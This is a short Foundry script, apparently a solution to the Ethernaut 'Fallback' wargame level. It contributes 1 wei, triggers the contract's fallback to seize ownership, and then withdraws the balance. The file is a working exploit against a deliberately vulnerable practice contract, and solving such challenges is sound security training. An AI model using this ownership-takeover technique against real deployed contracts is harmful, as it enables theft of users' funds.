// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0xb1C1C3a33428320964f28f6687Bf3Aacb72352C1));

    function run() external {
        vm.startBroadcast(vm.envAddress("MY_ADDRESS"));
        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        console.log("Balance: ", address(fallbackInstance).balance);
        vm.stopBroadcast();
    }
}